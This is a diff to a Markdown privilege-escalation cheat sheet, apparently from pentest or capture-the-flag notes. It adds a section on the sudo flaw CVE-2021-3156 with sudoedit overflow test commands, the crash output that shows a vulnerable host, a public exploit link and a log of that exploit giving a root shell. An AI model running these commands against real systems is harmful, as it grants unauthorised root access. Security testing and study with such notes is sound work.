@@ -200,6 +200,34 @@ There is also a dedicated toolset for identifying sudo vulnerabilities:
 * "sudo killer" by TH3xACE - https://github.com/TH3xACE/SUDO_KILLER
 
 
+
+### CVE-2021-3156 - Baron Samedit
+
+Test for sudo vulnerability 
+
+sudoedit -s '\' `perl -e 'print "A" x 65536'`
+sudoedit -s '\' `python3 -c 'print("A" * 65536)'`
+
+
+If the result is a memory corruption error, then the machine is vulnerable
+
+```bash
+malloc(): corrupted top size
+Aborted
+```
+
+https://github.com/worawit/CVE-2021-3156
+
+```bash
+shaun@doctor:/tmp/blub/CVE-2021-3156$ python3 exploit_nss.py
+python3 exploit_nss.py
+# whoami
+whoami
+root
+
+```
+
+
 ## pkexec
 
 Pkexec is similar to sudo, in that it lets you execute commands as another user (usually root) if you are part of a whitelisted group (usually 'admin' or similar).
@@ -226,4 +254,7 @@ If you can't run su or sudo and you cannot elevate despite having the root passw
 doas -u root /bin/sh 
 # type root password here
 ```
+
+
+
 
